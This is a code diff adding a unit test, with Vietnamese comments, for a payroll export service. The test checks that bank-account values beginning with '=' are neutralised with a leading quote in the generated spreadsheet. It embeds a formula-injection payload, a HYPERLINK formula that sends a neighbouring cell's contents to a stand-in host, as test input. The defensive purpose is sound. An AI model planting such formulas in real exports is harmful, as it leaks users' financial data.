@@ -157,6 +157,20 @@ describe("S15-PAYROLL-BE-4 · PayrollPaymentExportService (071)", () => {
     expect(rows[1][5]).toBe("1000");
   });
 
+  // security-reviewer BE-4 M1: `bankAccountNumber` (039) là `z.string()` không giới hạn charset ⇒ snapshot có thể chở
+  // công thức. Ô «Số tài khoản» PHẢI qua `xlsxSafe` như ba ô text còn lại; số TK hợp lệ (chữ số) giữ nguyên kể cả số 0 đầu.
+  it("ô «Số tài khoản» qua xlsxSafe: snapshot bắt đầu `=` được tiền tố `'`; số TK chữ số (kể cả 0 đầu) giữ NGUYÊN", async () => {
+    const { svc, batches } = build(2);
+    batches.linesForExportTx.mockResolvedValueOnce([
+      { ...lineStub(0, "bank"), bank_account_snapshot: '=HYPERLINK("http://x/?"&A2,"ok")' },
+      { ...lineStub(1, "bank"), bank_account_snapshot: "0001234567" },
+    ]);
+    const { buffer } = await svc.export(USER, BATCH_ID);
+    const rows = await readSheet(buffer);
+    expect(rows[1][3]).toBe(`'=HYPERLINK("http://x/?"&A2,"ok")`);
+    expect(rows[2][3]).toBe("0001234567");
+  });
+
   it("audit ĐÚNG MỘT hàng `read` payroll_payment_batch {rowCount, format} — KHÔNG số TK, KHÔNG tiền", async () => {
     const { svc, audit } = build(2);
     await svc.export(USER, BATCH_ID);
